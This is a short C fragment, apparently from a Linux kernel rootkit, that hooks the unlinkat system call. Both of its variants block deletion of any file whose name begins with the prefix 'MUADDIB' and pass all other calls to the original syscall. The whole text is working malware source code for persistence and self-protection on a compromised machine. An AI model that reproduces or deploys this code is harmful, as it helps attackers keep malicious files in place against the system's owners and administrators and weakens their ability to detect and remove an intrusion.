#ifdef PTREGS_SYSCALL_STUBS
#define PREFIX "MUADDIB"

static asmlinkage long (*og_unlinkat)(const struct pt_regs *);

asmlinkage int muaddib_unlinkat(const struct pt_regs *regs){
    char __user *pathname = (char *)regs->si;
    char file_name[NAME_MAX] = {0};
    long error = strncpy_from_user(file_name, pathname, NAME_MAX);
    if(memcmp(PREFIX, file_name, strlen(PREFIX)) == 0){
        return -1;
    }
    return og_unlinkat(regs);
}
#else

static asmlinkage long (*og_unlinkat)(int dirfd, const char *pathname, int flags);
asmlinkage int muaddib_unlinkat(int dirfd, const char *pathname, int flags){
    char file_name[NAME_MAX] = {0};
    long error = strncpy_from_user(file_name, pathname, NAME_MAX);
    if(memcmp(PREFIX, file_name, strlen(PREFIX)) == 0){
        return -1;
    }
    return og_unlinkat(dirfd, pathname, flags);
}

#endif
